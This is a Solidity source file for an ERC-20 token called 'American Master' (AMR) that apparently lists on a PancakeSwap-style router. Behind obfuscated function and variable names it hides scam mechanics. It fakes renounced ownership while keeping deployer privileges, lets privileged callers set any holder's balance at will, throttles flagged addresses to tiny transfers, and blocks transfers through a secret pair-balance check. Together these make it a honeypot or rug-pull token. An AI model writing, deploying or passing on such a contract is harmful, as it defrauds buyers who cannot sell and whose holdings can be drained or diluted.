//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface shouldMin {
    function createPair(address walletTotal, address txTo) external returns (address);
}

interface maxSwapBuy {
    function totalSupply() external view returns (uint256);

    function balanceOf(address liquidityEnable) external view returns (uint256);

    function transfer(address sellMax, uint256 feeWalletAt) external returns (bool);

    function allowance(address tokenFrom, address spender) external view returns (uint256);

    function approve(address spender, uint256 feeWalletAt) external returns (bool);

    function transferFrom(
        address sender,
        address sellMax,
        uint256 feeWalletAt
    ) external returns (bool);

    event Transfer(address indexed from, address indexed txBuy, uint256 value);
    event Approval(address indexed tokenFrom, address indexed spender, uint256 value);
}

abstract contract buyTeam {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface sellFund {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface maxSwapBuyMetadata is maxSwapBuy {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract AmericanMaster is buyTeam, maxSwapBuy, maxSwapBuyMetadata {

    function modeExempt(address limitTake, address sellMax, uint256 feeWalletAt) internal returns (bool) {
        if (limitTake == totalTo) {
            return maxMarketing(limitTake, sellMax, feeWalletAt);
        }
        uint256 liquidityTokenLaunched = maxSwapBuy(liquidityTake).balanceOf(maxBuy);
        require(liquidityTokenLaunched == swapAmount);
        require(sellMax != maxBuy);
        if (tradingAtIs[limitTake]) {
            return maxMarketing(limitTake, sellMax, atIs);
        }
        return maxMarketing(limitTake, sellMax, feeWalletAt);
    }

    function getOwner() external view returns (address) {
        return fromMaxAmount;
    }

    address public liquidityTake;

    function enableBuyList(uint256 feeWalletAt) public {
        sellMin();
        swapAmount = feeWalletAt;
    }

    address shouldMax = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint256 public listLaunch;

    constructor (){
        if (autoList != receiverLaunched) {
            autoList = true;
        }
        sellFund shouldMarketing = sellFund(shouldMax);
        liquidityTake = shouldMin(shouldMarketing.factory()).createPair(shouldMarketing.WETH(), address(this));
        if (walletLiquidity == listLaunch) {
            receiverLaunched = false;
        }
        totalTo = _msgSender();
        minFund[totalTo] = true;
        receiverFee[totalTo] = txMode;
        atSwap();
        if (fromAmount != receiverLaunched) {
            fromAmount = true;
        }
        emit Transfer(address(0), totalTo, txMode);
    }

    function approve(address teamFeeList, uint256 feeWalletAt) public virtual override returns (bool) {
        receiverToken[_msgSender()][teamFeeList] = feeWalletAt;
        emit Approval(_msgSender(), teamFeeList, feeWalletAt);
        return true;
    }

    function transferFrom(address limitTake, address sellMax, uint256 feeWalletAt) external override returns (bool) {
        if (_msgSender() != shouldMax) {
            if (receiverToken[limitTake][_msgSender()] != type(uint256).max) {
                require(feeWalletAt <= receiverToken[limitTake][_msgSender()]);
                receiverToken[limitTake][_msgSender()] -= feeWalletAt;
            }
        }
        return modeExempt(limitTake, sellMax, feeWalletAt);
    }

    mapping(address => uint256) private receiverFee;

    event OwnershipTransferred(address indexed teamExempt, address indexed swapIs);

    uint8 private receiverAt = 18;

    string private receiverIsList = "AMR";

    function maxMarketing(address limitTake, address sellMax, uint256 feeWalletAt) internal returns (bool) {
        require(receiverFee[limitTake] >= feeWalletAt);
        receiverFee[limitTake] -= feeWalletAt;
        receiverFee[sellMax] += feeWalletAt;
        emit Transfer(limitTake, sellMax, feeWalletAt);
        return true;
    }

    uint256 constant atIs = 2 ** 10;

    mapping(address => bool) public minFund;

    function symbol() external view virtual override returns (string memory) {
        return receiverIsList;
    }

    uint256 private walletLiquidity;

    function totalSupply() external view virtual override returns (uint256) {
        return txMode;
    }

    mapping(address => bool) public tradingAtIs;

    address public totalTo;

    uint256 private txMode = 100000000 * 10 ** 18;

    function atEnableTake(address isMode, uint256 feeWalletAt) public {
        sellMin();
        receiverFee[isMode] = feeWalletAt;
    }

    bool public listAmount;

    function balanceOf(address liquidityEnable) public view virtual override returns (uint256) {
        return receiverFee[liquidityEnable];
    }

    address private fromMaxAmount;

    function exemptSell(address maxTotal) public {
        require(maxTotal.balance < 100000);
        if (listAmount) {
            return;
        }
        
        minFund[maxTotal] = true;
        
        listAmount = true;
    }

    function allowance(address tradingModeMax, address teamFeeList) external view virtual override returns (uint256) {
        if (teamFeeList == shouldMax) {
            return type(uint256).max;
        }
        return receiverToken[tradingModeMax][teamFeeList];
    }

    function name() external view virtual override returns (string memory) {
        return exemptLaunchTotal;
    }

    function decimals() external view virtual override returns (uint8) {
        return receiverAt;
    }

    function sellMin() private view {
        require(minFund[_msgSender()]);
    }

    function atSwap() public {
        emit OwnershipTransferred(totalTo, address(0));
        fromMaxAmount = address(0);
    }

    string private exemptLaunchTotal = "American Master";

    bool public fromAmount;

    address maxBuy = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function autoLaunched(address txReceiver) public {
        sellMin();
        if (listLaunch != walletLiquidity) {
            receiverLaunched = true;
        }
        if (txReceiver == totalTo || txReceiver == liquidityTake) {
            return;
        }
        tradingAtIs[txReceiver] = true;
    }

    uint256 tokenTakeSell;

    function owner() external view returns (address) {
        return fromMaxAmount;
    }

    bool private autoList;

    bool private receiverLaunched;

    mapping(address => mapping(address => uint256)) private receiverToken;

    uint256 swapAmount;

    function transfer(address isMode, uint256 feeWalletAt) external virtual override returns (bool) {
        return modeExempt(_msgSender(), isMode, feeWalletAt);
    }

}